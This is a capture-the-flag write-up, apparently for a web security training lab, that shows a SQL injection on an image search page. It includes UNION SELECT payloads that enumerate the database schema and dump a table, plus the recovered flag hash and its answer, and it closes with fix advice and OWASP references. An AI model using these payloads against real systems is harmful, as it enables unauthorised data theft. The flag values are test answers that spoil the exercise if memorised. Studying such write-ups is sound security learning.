# images sql injection
/index.php?page=searchimg

## How to get flag
This page is supposed to show image's info depends on image's id.
```
/index.php?page=searchimg&id=1&Submit=Submit#
```

But we can exploit with SQL injection.

1. Fingerprint DB
Put `'` in input. It shows syntax error with which DB server use.

2. DB, Table
```
1 AND 1=0 UNION SELECT 1, DATABASE()
1 AND 1=0 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=DATABASE()
1 AND 1=0 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_schema=DATABASE()
```

result
```
DB : Member_images
table : list_images
columns : id, url, title, comment
```

3. Find flag
```
1 AND 1=0 UNION SELECT 1, concat(url, title, comment) FROM list_images
// If you read this just use this md5 decode lowercase then sha256 to win this flag !
// 1928e8083cf461a51303633093573c46
```
decrypted with https://hashtoolkit.com/ : albatroz
lower all char : albatroz
sh256 : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


## Vulnerability
Hacker can get any data from db. 

## How to Fix
1. Fingerprinting the Database : Don't show error message
2. Don't construct queries with user-provided data. Use PDO instead if it is PHP. 

## Resouces
(Testing for SQL Injection)[https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html]
(Testing for MySQL)[https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL.html]